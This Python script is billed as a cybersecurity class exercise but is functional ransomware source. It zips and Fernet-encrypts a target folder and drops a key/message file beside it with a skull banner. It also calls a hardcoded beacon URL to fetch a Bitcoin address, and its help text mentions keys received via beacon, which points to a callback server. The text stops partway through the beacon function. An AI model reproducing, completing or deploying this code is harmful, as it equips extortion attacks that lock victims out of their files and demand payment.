#!/usr/bin/env python3
"""
Folder encryption script for cybersecurity class.

Features:
- Takes a folder path, zips all its contents, and encrypts the zip using
  the `cryptography` library (Fernet).
- Writes the encrypted archive as a single `.enc` file.
- Drops a text file into the target folder with a short message and the
  generated encryption key (base64 URL-safe string).
- Supports a decrypt mode that uses the stored key to restore the files
  into a new folder.

Requirements:
- Python 3.8+
- cryptography  (install with: pip install cryptography)
"""

from __future__ import annotations

import argparse
import json
import getpass
import io
import os
import platform
import shutil
import socket
import sys
import time
import urllib.request
import urllib.parse
import urllib.error
from dataclasses import dataclass
from pathlib import Path
from typing import Optional
import zipfile

from cryptography.fernet import Fernet, InvalidToken


DEFAULT_INFO_FILENAME = "encryption_info.txt"
BEACON_URL = "http://localhost/beacon.php"

# Embedded skull art (from skulls.txt)
SKULL_ART = r"""⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣧⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣛⡛⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣹⣽⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣷⣦⣌⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣯⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣴⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣾⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⡬⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⡈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣿⣉⣭⣭⣭⡿⣿⣻⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣿⡏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡃
⢸⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣤⢶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢹⣷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠻⠿⠿⢿⣿⣿⣟⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣾⡇
⢸⣿⣿⣿⣿⣿⣿⣿⠏⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⡏⢹⣿⣿⣿⡿⠟⠛⠛⠿⣿⣿⣿⣿⣿⠀⠐⠛⠛⠃⠀⢢⠀⢹⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢳⣾⣿⣿⡇
⢸⣿⣿⣿⣿⣿⣿⡏⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⡟⣿⠀⣿⡿⠋⠀⠂⠀⠀⠀⠹⣿⡖⣿⣿⠀⠀⠀⠀⠀⠀⢸⠿⠀⣿⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⡇
⢸⣿⣿⣿⣿⣿⡏⢠⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢳⣻⣶⡟⠀⠀⠀⠀⠀⢸⠃⠀⣿⠧⠛⢿⣄⡀⠀⠀⣀⢀⠾⠀⢸⣿⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⠇
⢸⣿⣿⣿⣿⣿⠁⠋⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⣻⡇⠀⠀⠀⠀⠀⠘⠀⣰⡏⠀⠀⠀⠻⣿⣶⣤⣉⣉⣠⣴⣿⣿⣿⢁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⡿⠋⠀⠀
⢸⣿⣿⣿⣿⣿⡇⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠱⢾⡄⠀⠀⠀⠀⠀⣠⣿⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡍⢡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡼⡄⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⠀⢰⠋⠉⠀⠀⠀⠀⠈⣿⣿⣿⡿⠿⢿⣿⣿⣿⡿⣡⣿⡟⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢾⣿⣶⣀⣀⣶⣿⣿⣿⣦⣀⣤⢦⣤⣿⣿⣿⣿⣿⠟⢋⡿⢇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠙⣄⠀⠀⠀
⢸⣿⣿⣿⣿⡿⠃⡄⠀⠀⠀⠰⠀⠀⣠⡯⣽⡛⠀⠀⡀⠈⠻⣿⡧⣾⠏⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⠃⢸⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣼⣟⡶⡆
⢸⣿⣿⣿⣿⡇⠸⣿⣦⡀⠀⣀⣠⣾⠟⠃⢿⣧⠀⠀⠁⠘⠀⠘⣇⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡀⠘⢿⡿⣿⣿⣿⣿⣿⣿⠻⣿⣿⣿⡟⢃⣡⡧⠀⣾⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣮⣙⠳⡇
⢸⣿⣿⣿⣿⣿⡶⢈⢛⣿⣿⣿⡿⠋⢀⡆⢸⣿⡀⠀⠦⠄⠀⣸⡇⣴⣿⣿⣿⣿⣿⣿⣿⣿⣛⣿⣷⣶⣷⣶⣾⣍⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠈⠓⠿⡿⣿⡟⣻⢩⣯⣽⣷⠙⠃⠈⠁⢠⠴⡞⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄
⢀⠸⣿⣿⣿⣿⠃⡼⢻⣿⣿⣟⣣⣀⡈⠁⢸⣿⣿⣿⣶⣾⢯⣿⢻⣿⣿⣿⣿⣿⣿⣿⢳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠁⠑⡓⠛⠃⠉⣈⠉⠀⠀⠀⠀⠀⣀⣾⣾⡐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠸⠆⢻⣿⣿⡟⢰⣷⠀⠪⢝⡻⢿⣿⣿⣿⣿⣿⣿⢿⣩⡷⢂⣼⣿⣿⣿⣿⣿⣿⡟⠉⠋⠁⠈⢿⣿⠃⠀⠈⠙⢿⣿⣿⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⠀⢳⣀⠀⡀⢀⠀⣀⣠⣖⢺⣟⣛⢸⣿⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠀⢸⣿⣿⣧⠘⣿⣇⢀⠀⠁⠘⠐⠗⠾⠿⠿⠧⣼⣿⠇⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣠⣀⣀⣹⣷⡀⠀⠀⠀⠀⢻⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠐⣍⣧⣽⣬⣧⣼⣿⣿⣿⣿⣿⡿⠟⠀⡛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⢸⢃⣸⣿⣿⣿⣧⠸⣿⣿⣤⣀⣆⠠⢠⠤⠤⣤⣶⣼⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⡹⠋⠉⠽⠿⣿⣿⡄⠺⠣⠀⣾⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠹⣾⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⣠⡞⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠘⣸⣿⣿⣿⣿⣿⣆⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⢉⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡁⠀⠀⠀⠀⠈⠙⠃⠀⣇⡐⠃⣼⣿⣿⣿⣿⢿⣷⣦⣍⣻⡛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡯⣝⣿⣿⣷⣶⣶⠛⣿⣿⣧⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣟⣻⣟⠛⠛⠿⡇
⢰⣿⣿⣿⣿⣿⣿⣿⣷⠀⢩⣟⡛⠿⠿⠛⢉⣠⡔⠒⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡄⢠⠀⠀⠀⠀⢸⠟⠉⠈⣿⣿⣿⣿⠇⣘⣻⣻⣿⢻⣿⣷⡿⠿⡛⢿⣟⣿⣿⣿⡿⣛⣻⣿⡇⠉⠀⠀⠉⠁⢠⣿⡏⢹⣿⣷⣾⣿⣍⢻⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣷⡆
⢨⣭⣉⣿⡿⠟⠋⠐⠺⠂⣿⣤⣏⢙⣿⣿⣿⠛⠃⠀⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠁⠈⠀⠀⠀⢠⡾⢶⠋⡀⢹⣿⣿⣏⣿⣿⣿⣿⣿⣉⡁⠹⣿⡌⣿⣿⡿⠉⠉⠀⣀⣀⡀⠈⠁⠨⠀⠀⠀⠀⠊⠙⢃⠈⠍⠉⣿⣿⡿⠟⠛⠛⠛⢉⣉⣭⣿⣿⣿⡆⢉⠉⠁⡄
⠈⠻⢿⣟⠁⠀⠀⠀⠀⠒⠈⠙⠻⠿⣿⣿⣿⠏⠉⠉⠑⢶⣦⡉⢻⣿⣿⣿⣿⡿⠿⠿⣿⣿⡀⠀⠀⠃⢀⣾⡏⠉⠙⠀⠈⣿⣿⣇⣹⣿⣿⣿⣿⣏⠀⠂⢸⣿⣿⣼⠀⠀⠀⠀⠀⠠⠄⠀⠀⠀⣀⣀⣀⡀⠂⢀⣩⣴⣶⠿⠛⠉⠀⢠⣤⡄⠯⣾⣿⣿⣿⣿⣿⠇⠀⠻⠀⠀
⠀⠀⣀⠙⣿⣶⣤⣀⡈⢀⣿⣿⣶⣶⣤⣴⣾⠀⠀⠀⠀⠀⣻⣿⣤⣿⣷⣶⣿⣿⣿⣷⣷⣦⣥⠆⣠⣾⣿⠟⠓⠀⠀⡀⠀⠈⠍⠛⢉⣿⣿⣿⣿⣿⡆⠀⣶⡻⣿⡿⠙⢻⣿⣶⣿⣶⣶⣶⣤⣾⣿⣿⣿⣿⣿⠿⠛⡉⠀⠀⠀⠊⢀⣼⣿⠻⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⡀⠀
⢀⠀⢻⣇⠙⣽⠛⠿⢿⣾⣿⣿⣿⣿⣿⡏⢀⣤⣴⣾⣿⣿⣿⣿⣿⡛⠋⠉⠉⠉⠉⠛⣿⣿⣿⡁⢈⠉⢁⣀⠀⠀⠘⠒⢂⡀⠄⠉⢹⣿⠿⠟⠛⠁⠀⠀⢻⣷⡆⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⠹⠿⠿⠛⠉⠀⠐⠋⠡⠀⡀⠀⣠⣾⡟⢻⣷⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠁⠀
⠀⠀⠈⠛⣷⣤⣀⡀⣾⣿⣿⣿⣿⣿⣿⣧⠸⡿⠟⠛⠉⠁⢠⣿⣿⠃⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠀⠈⣿⣿⡷⠉⢙⣩⠅⢠⣤⣤⣿⣿⠆⣠⠀⠀⡀⠀⠀⠹⣷⡀⠙⢿⣿⣿⣿⣿⣿⠏⢁⡀⠀⠀⠀⠀⠀⠀⢀⣐⣉⣴⣾⣿⠟⠀⠀⣿⣿⣧⣿⣿⣿⣫⠟⢻⣷⠀⠀⡀
⠀⠀⠀⠀⢌⠙⠻⣿⡏⠁⣀⠀⠙⠛⠋⠁⠀⠀⠀⢀⣠⣴⣿⣿⠃⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣃⣀⣀⠙⠟⢀⣀⡀⠀⣀⡸⢿⣿⣿⠇⣼⣷⣇⣰⠀⠀⠀⠀⠻⢷⡀⠈⢿⣿⠛⠛⠁⢠⣾⣿⣿⣿⡿⠻⡿⠿⠟⠛⣉⠙⢉⣀⣀⠀⢸⣿⡗⢸⣿⣿⡿⠃⡄⣿⣿⣇⠈⠁
⢸⣦⣀⠀⠀⠀⠀⠈⣷⣿⣿⣿⣷⣦⢿⣿⣶⡿⠿⠟⠛⠋⠉⢳⣧⠀⠀⠀⡠⠖⠋⣿⡿⣿⣿⠈⢍⠻⣿⠇⠘⠀⠈⠉⠀⢠⣾⣿⡏⠀⣿⣿⡿⢿⣀⡀⠀⣀⣠⣤⣧⣤⡀⠀⠀⠀⠐⠟⠛⠉⠁⠀⠀⠀⠂⠘⠓⠚⢁⠔⠀⠀⠈⢁⣼⣿⠟⡿⣿⡏⢀⣾⣇⢸⣿⣿⡄⠀
⠈⢿⠿⢿⣦⣤⡀⠺⠛⠿⢿⣿⡿⠋⠀⣀⠘⠉⠀⠀⠀⠀⠀⣸⣿⠀⢀⠎⣠⣾⢰⣿⡽⣿⣿⠀⠤⠠⣤⡆⠀⠲⠶⢶⣶⣾⣿⣿⣥⣞⡁⢹⣷⣈⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⣶⡦⠀⢠⡶⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠐⢃⣸⣶⣿⣿⣯⡿⣱⣿⡇⢼⣿⣿⢸⣿⣿⡷⠀
⠐⠢⠀⠀⠉⠉⠛⣷⣦⣄⣸⣥⣀⣠⣦⣤⣤⣤⣤⣶⣦⣾⣿⡿⠃⢀⡌⢰⣿⡿⢸⣿⡇⣿⣿⣇⣀⣀⠈⠉⠀⣀⡀⠀⢠⣿⣿⡏⢨⢹⣷⢸⣿⣿⡌⠙⠿⠿⢿⣿⣏⣿⣿⣿⣧⠀⡆⢸⣿⣄⠀⠀⠀⠀⠈⢓⣀⣤⣴⣾⣿⣿⡿⣿⠟⠁⠀⢹⣿⣿⡌⣿⣿⢸⣿⣿⡇⡄"""


@dataclass
class EncryptConfig:
    folder: Path
    output_file: Path
    info_file: Path
    slow_demo: bool
    callback_url: Optional[str] = None


@dataclass
class DecryptConfig:
    folder: Path
    encrypted_file: Path
    info_file: Optional[Path]  # Optional when --key is provided
    output_folder: Path
    key: Optional[bytes] = None  # When set, use instead of reading from info file


def parse_args(argv: Optional[list[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Zip and encrypt a folder using Fernet (AES-based) encryption, "
            "and optionally decrypt it again."
        )
    )

    parser.add_argument(
        "--folder",
        type=str,
        required=True,
        help="Path to the folder to encrypt (and where the info file will be written).",
    )
    parser.add_argument(
        "--output",
        type=str,
        help=(
            "Path for the encrypted archive file. "
            "Defaults to <folder>/<foldername>.zip.enc."
        ),
    )
    parser.add_argument(
        "--decrypt",
        action="store_true",
        help="Run in decrypt mode instead of encrypt mode.",
    )
    parser.add_argument(
        "--slow-demo",
        action="store_true",
        help=(
            "Slow zipping/encryption to roughly 1 minute with a visible progress bar. "
            "If not set, zipping runs at full speed."
        ),
    )
    parser.add_argument(
        "--encrypted-file",
        type=str,
        help=(
            "Path to the encrypted .enc file (used in decrypt mode). "
            "Defaults to the same as --output or <folder>.zip.enc."
        ),
    )
    parser.add_argument(
        "--output-folder",
        type=str,
        help=(
            "Output folder for decrypted contents (decrypt mode). "
            "Defaults to the same folder passed in --folder."
        ),
    )
    parser.add_argument(
        "--info-file",
        type=str,
        help=(
            "Path to the encryption info text file. "
            f"Defaults to <folder>/{DEFAULT_INFO_FILENAME}."
        ),
    )
    parser.add_argument(
        "--key",
        type=str,
        metavar="KEY",
        help=(
            "Decrypt mode: Fernet key (base64). If the key starts with -, use "
            "--key=KEY or --key-file. Use when the key was received via beacon."
        ),
    )
    parser.add_argument(
        "--key-file",
        type=str,
        metavar="FILE",
        help="Decrypt mode: read Fernet key from FILE (use for keys that start with -).",
    )
    parser.add_argument(
        "--quiet",
        "-q",
        action="store_true",
        help="Suppress all CLI output (progress, messages, skull).",
    )

    return parser.parse_args(argv)


def build_encrypt_config(args: argparse.Namespace) -> EncryptConfig:
    folder = Path(args.folder).expanduser().resolve()
    if not folder.exists() or not folder.is_dir():
        raise SystemExit(f"Folder does not exist or is not a directory: {folder}")

    if args.output:
        output_file = Path(args.output).expanduser().resolve()
    else:
        # Default: place encrypted archive *inside* the target folder.
        output_file = folder / f"{folder.name}.zip.enc"

    if args.info_file:
        info_file = Path(args.info_file).expanduser().resolve()
    else:
        info_file = folder / DEFAULT_INFO_FILENAME

    return EncryptConfig(
        folder=folder,
        output_file=output_file,
        info_file=info_file,
        slow_demo=bool(getattr(args, "slow_demo", False)),
        callback_url=BEACON_URL,
    )


def build_decrypt_config(args: argparse.Namespace) -> DecryptConfig:
    folder = Path(args.folder).expanduser().resolve()
    if not folder.exists() or not folder.is_dir():
        raise SystemExit(f"Folder does not exist or is not a directory: {folder}")

    if args.encrypted_file:
        encrypted_file = Path(args.encrypted_file).expanduser().resolve()
    elif args.output:
        encrypted_file = Path(args.output).expanduser().resolve()
    else:
        # Default encrypted file location matches encrypt mode:
        encrypted_file = folder / f"{folder.name}.zip.enc"

    if not encrypted_file.exists():
        raise SystemExit(f"Encrypted file not found: {encrypted_file}")

    key_from_arg: Optional[bytes] = None
    key_file = getattr(args, "key_file", None)
    if key_file:
        key_path = Path(key_file).expanduser().resolve()
        if not key_path.exists() or not key_path.is_file():
            raise SystemExit(f"Key file not found: {key_path}")
        key_from_arg = key_path.read_text(encoding="utf-8").strip().encode("utf-8")
    elif getattr(args, "key", None):
        key_from_arg = args.key.strip().encode("utf-8")

    if args.info_file:
        info_file = Path(args.info_file).expanduser().resolve()
    else:
        info_file = folder / DEFAULT_INFO_FILENAME

    if key_from_arg is None and (not info_file.exists() or not info_file.is_file()):
        raise SystemExit(
            f"Encryption info file not found: {info_file}. "
            "Provide --key or --key-file with the Fernet key (e.g. from your beacon log) to decrypt."
        )

    if args.output_folder:
        output_folder = Path(args.output_folder).expanduser().resolve()
    else:
        # Default: restore files back into the original folder.
        output_folder = folder

    return DecryptConfig(
        folder=folder,
        encrypted_file=encrypted_file,
        info_file=info_file,
        output_folder=output_folder,
        key=key_from_arg,
    )


def zip_folder_to_bytes(
    folder: Path,
    exclude: Optional[set[Path]] = None,
    target_seconds: Optional[float] = None,
) -> bytes:
    """
    Create a zip archive of the given folder and return its bytes.

    The archive stores paths relative to the folder root.
    """
    buffer = io.BytesIO()

    # First collect all files to include so we can show progress
    # and slow the process to roughly target_seconds.
    files_to_zip: list[tuple[Path, Path]] = []
    for root, _dirs, files in os.walk(folder):
        root_path = Path(root)
        for name in files:
            file_path = root_path / name
            if exclude and file_path in exclude:
                continue
            rel_path = file_path.relative_to(folder)
            files_to_zip.append((file_path, rel_path))

    total = len(files_to_zip)
    if total == 0:
        return buffer.getvalue()

    if target_seconds is not None and target_seconds > 0:
        delay_per_file = target_seconds / total
    else:
        delay_per_file = 0.0

    bar_width = 40

    with zipfile.ZipFile(buffer, mode="w", compression=zipfile.ZIP_DEFLATED) as zf:
        for index, (file_path, rel_path) in enumerate(files_to_zip, start=1):
            zf.write(file_path, arcname=str(rel_path))

            progress = index / total
            filled = int(bar_width * progress)
            bar = "#" * filled + "-" * (bar_width - filled)
            percent = int(progress * 100)
            print(
                f"\r[ Zipping {bar} ] {percent:3d}% ({index}/{total})",
                end="",
                flush=True,
            )

            if delay_per_file > 0 and index < total:
                time.sleep(delay_per_file)

    print()  # newline after progress bar
    return buffer.getvalue()


def generate_key() -> bytes:
    """Generate a new random Fernet key."""
    return Fernet.generate_key()


def fetch_bitcoin_address(beacon_url: str) -> Optional[str]:
    """
    GET beacon URL with ?action=new_address and return the Bitcoin address if present.
    Returns None on any failure (so encryption flow is unaffected).
    """
    addr, _ = fetch_bitcoin_address_with_error(beacon_url)
    return addr


def fetch_bitcoin_address_with_error(beacon_url: str) -> tuple[Optional[str], Optional[str]]:
    """
    GET beacon URL with ?action=new_address. Returns (address, error_message).
    If ok and address present, returns (address, None). Otherwise (None, error_message).
    """
    try:
        sep = "&" if "?" in beacon_url else "?"
        url = f"{beacon_url.rstrip('/')}{sep}action=new_address"
        req = urllib.request.Request(url, headers={"User-Agent": "encrypt_folder.py/1"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = resp.read().decode("utf-8")
        out = json.loads(data)
        if isinstance(out, dict):
            if out.get("ok") and isinstance(out.get("address"), str):
                return (out["address"].strip() or None, None)
            return (None, str(out.get("error", "No address in response")).strip() or "Unknown error")
    except urllib.error.URLError as e:
